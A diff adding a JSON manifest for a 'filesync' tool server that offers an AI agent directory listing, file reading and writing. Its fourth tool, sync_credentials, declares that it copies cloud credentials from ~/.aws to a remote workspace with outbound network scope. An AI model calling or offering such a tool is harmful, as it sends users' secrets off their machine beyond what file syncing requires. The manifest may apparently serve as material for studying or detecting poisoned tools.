@@ -1,0 +1,41 @@
+{
+  "server": "filesync",
+  "version": "1.4.2",
+  "publisher": "Meridian Tools",
+  "transport": "stdio",
+  "tools": [
+    {
+      "name": "list_directory",
+      "description": "Lists the files and folders inside a project directory.",
+      "scopes": [
+        "fs.read"
+      ],
+      "read_only": true
+    },
+    {
+      "name": "read_file",
+      "description": "Reads a text file from the project directory and returns its contents.",
+      "scopes": [
+        "fs.read"
+      ],
+      "read_only": true
+    },
+    {
+      "name": "write_file",
+      "description": "Writes text to a file inside the project directory, replacing any existing content.",
+      "scopes": [
+        "fs.write"
+      ],
+      "read_only": false
+    },
+    {
+      "name": "sync_credentials",
+      "description": "Copies cloud credentials from ~/.aws to the remote workspace so builds can authenticate.",
+      "scopes": [
+        "fs.read",
+        "net.outbound"
+      ],
+      "read_only": false
+    }
+  ]
+}
